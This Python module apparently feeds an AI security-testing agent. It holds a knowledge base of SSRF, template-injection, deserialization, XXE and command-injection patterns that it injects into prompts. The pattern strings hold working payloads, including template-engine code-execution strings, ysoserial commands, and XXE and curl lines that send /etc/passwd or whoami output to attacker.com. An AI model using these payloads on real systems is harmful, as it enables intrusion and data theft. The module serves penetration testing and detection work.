"""Injection and deserialization vulnerability knowledge base.

Deep knowledge about injection attacks:
1. Server-Side Request Forgery (SSRF)
2. Server-Side Template Injection (SSTI)
3. Insecure deserialization
4. XML External Entity (XXE) injection
5. OS command injection techniques
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class InjectionPattern:
    """An injection vulnerability pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "critical"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:15],
        }


INJECTION_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "inj-001", "name": "Server-Side Request Forgery (SSRF)",
        "category": "ssrf", "severity": "critical",
        "desc": "Making the server send requests to unintended locations.",
        "detection": (
            "SSRF DETECTION:\n"
            "COMMON ENTRY POINTS:\n"
            "  - URL parameters: ?url=, ?image=, ?src=, ?redirect=\n"
            "  - PDF generators (HTML-to-PDF)\n"
            "  - Webhooks configuration\n"
            "  - File imports from URL\n"
            "  - Proxy/gateway functionality\n"
            "  - RSS feed readers\n"
            "PAYLOADS:\n"
            "  Cloud metadata:\n"
            "    http://169.254.169.254/latest/meta-data/  (AWS)\n"
            "    http://metadata.google.internal/computeMetadata/v1/  (GCP)\n"
            "    http://169.254.169.254/metadata/instance  (Azure)\n"
            "  Internal services:\n"
            "    http://localhost:8080/admin\n"
            "    http://127.0.0.1:6379/  (Redis)\n"
            "    http://internal-db:3306/  (MySQL)\n"
            "  Protocol smuggling:\n"
            "    gopher://127.0.0.1:6379/_*1%0d%0a%24%38%0d%0a  (Redis)\n"
            "    dict://127.0.0.1:6379/info\n"
            "    file:///etc/passwd\n"
            "BYPASS TECHNIQUES:\n"
            "  - IP encoding: 0x7f000001, 2130706433, 017700000001\n"
            "  - DNS rebinding: attacker domain → 127.0.0.1\n"
            "  - Open redirect chain: target.com/redirect?url=evil\n"
            "  - URL parser inconsistencies: http://127.0.0.1:80@evil.com\n"
            "  - IPv6: [::1], [0:0:0:0:0:0:0:1]\n"
            "  - Domain confusion: 127.0.0.1.nip.io"
        ),
        "tools": ["burp", "nuclei", "ssrf-sheriff"],
    },
    {
        "id": "inj-002", "name": "Server-Side Template Injection (SSTI)",
        "category": "ssti", "severity": "critical",
        "desc": "Injecting template expressions for RCE.",
        "detection": (
            "SSTI DETECTION:\n"
            "IDENTIFICATION:\n"
            "  1. Send mathematical expression:\n"
            "     {{7*7}} → 49? (Jinja2/Twig)\n"
            "     ${7*7} → 49? (Freemarker/Velocity)\n"
            "     #{7*7} → 49? (Thymeleaf)\n"
            "     {{7*'7'}} → 7777777? (Jinja2)\n"
            "  2. Error messages reveal template engine\n"
            "EXPLOITATION BY ENGINE:\n"
            "  Jinja2 (Python):\n"
            "    {{config}} → application config\n"
            "    {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}\n"
            "    {{request.application.__self__._get_data_for_json.__globals__['__builtins__']['__import__']('os').popen('id').read()}}\n"
            "  Freemarker (Java):\n"
            "    <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n"
            "  Velocity (Java):\n"
            "    #set($str=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\"))\n"
            "  Twig (PHP):\n"
            "    {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n"
            "  ERB (Ruby):\n"
            "    <%= system('id') %>\n"
            "TOOLS:\n"
            "  tplmap -u 'http://target/?param=SSTI_HERE'\n"
            "  SSTImap --url 'http://target/?param=*'"
        ),
        "tools": ["tplmap", "sstimap", "burp"],
    },
    {
        "id": "inj-003", "name": "Insecure Deserialization",
        "category": "deserialization", "severity": "critical",
        "desc": "Exploiting deserialization of untrusted data.",
        "detection": (
            "INSECURE DESERIALIZATION:\n"
            "IDENTIFICATION:\n"
            "  Java:\n"
            "    - Magic bytes: AC ED 00 05 (serialized object)\n"
            "    - Base64: rO0AB (serialized object)\n"
            "    - Content-Type: application/x-java-serialized-object\n"
            "    - ViewState parameters\n"
            "  PHP:\n"
            "    - O:4:\"User\":2:{...} (PHP serialized)\n"
            "    - a:2:{i:0;s:4:\"test\"} (PHP array)\n"
            "  Python:\n"
            "    - pickle/cPickle usage\n"
            "    - yaml.load() (without SafeLoader)\n"
            "  .NET:\n"
            "    - __VIEWSTATE parameter\n"
            "    - BinaryFormatter, SoapFormatter, ObjectStateFormatter\n"
            "EXPLOITATION:\n"
            "  Java (ysoserial):\n"
            "    java -jar ysoserial.jar CommonsCollections1 'id' | base64\n"
            "    Gadget chains: CommonsCollections1-7, Spring, URLDNS\n"
            "  PHP:\n"
            "    Craft serialized object with __wakeup() or __destruct()\n"
            "    phpggc: phpggc <chain> <command>\n"
            "  Python:\n"
            "    import pickle; pickle.loads(malicious_data)\n"
            "    __reduce__ method for arbitrary code execution\n"
            "  .NET:\n"
            "    ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c 'cmd'"
        ),
        "tools": ["ysoserial", "phpggc", "burp"],
    },
    {
        "id": "inj-004", "name": "XML External Entity (XXE)",
        "category": "xxe", "severity": "critical",
        "desc": "Exploiting XML parsers for file read and SSRF.",
        "detection": (
            "XXE INJECTION:\n"
            "BASIC XXE (File Read):\n"
            "  <?xml version=\"1.0\"?>\n"
            "  <!DOCTYPE foo [\n"
            "    <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
            "  ]>\n"
            "  <root>&xxe;</root>\n"
            "BLIND XXE (Out-of-Band):\n"
            "  <!DOCTYPE foo [\n"
            "    <!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">\n"
            "    %xxe;\n"
            "  ]>\n"
            "  evil.dtd:\n"
            "    <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n"
            "    <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>\">\n"
            "    %eval; %exfil;\n"
            "XXE via File Upload:\n"
            "  - SVG files: <svg><text>&xxe;</text></svg>\n"
            "  - DOCX/XLSX: Modify XML inside zip archive\n"
            "  - PDF: XFA forms in PDF can contain XML\n"
            "BYPASS:\n"
            "  - UTF-16 encoding to bypass WAF\n"
            "  - Use CDATA sections\n"
            "  - PHP filters: php://filter/read=convert.base64-encode/resource=file\n"
            "  - Expect: expect://id\n"
            "DETECTION:\n"
            "  - Look for XML input (Content-Type: application/xml)\n"
            "  - Look for SOAP endpoints\n"
            "  - File upload accepting XML-based formats"
        ),
        "tools": ["burp", "xxeinjector", "nuclei"],
    },
    {
        "id": "inj-005", "name": "OS Command Injection",
        "category": "command", "severity": "critical",
        "desc": "Injecting operating system commands.",
        "detection": (
            "OS COMMAND INJECTION:\n"
            "COMMON ENTRY POINTS:\n"
            "  - Filename parameters\n"
            "  - DNS lookups / host resolution\n"
            "  - Ping/traceroute functionality\n"
            "  - File conversion (ImageMagick, ffmpeg)\n"
            "  - System administration pages\n"
            "  - PDF generators (wkhtmltopdf)\n"
            "PAYLOADS:\n"
            "  Inline execution:\n"
            "    ; id\n"
            "    | id\n"
            "    || id\n"
            "    && id\n"
            "    $(id)\n"
            "    `id`\n"
            "  Newline:\n"
            "    %0a id\n"
            "    %0d%0a id\n"
            "  Blind detection:\n"
            "    ; sleep 10 → response delay?\n"
            "    | ping -c 10 attacker.com → DNS/ICMP callback?\n"
            "    ; curl http://attacker.com/$(whoami)\n"
            "BYPASS:\n"
            "  - Spaces: ${IFS}, $IFS, {cat,/etc/passwd}, tab (%09)\n"
            "  - Semicolons: $'\\x3b'\n"
            "  - Slashes: ${PATH:0:1}\n"
            "  - Encoding: hex \\x2f, octal \\057\n"
            "  - Wildcards: /e?c/pa??wd, /???/p*\n"
            "TOOLS:\n"
            "  commix -u 'http://target/?ip=INJECT'\n"
            "  nuclei with command injection templates"
        ),
        "tools": ["commix", "nuclei", "burp"],
    },
]


class InjectionKB:
    """Injection vulnerability knowledge base.

    Provides injection attack patterns injected
    into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, InjectionPattern] = {}
        self._log = logger.bind(component="injection_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load injection patterns."""
        for data in INJECTION_PATTERNS:
            pattern = InjectionPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "critical"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[InjectionPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_injection_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build injection security prompt."""
        lines = ["## Injection Vulnerability Patterns\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
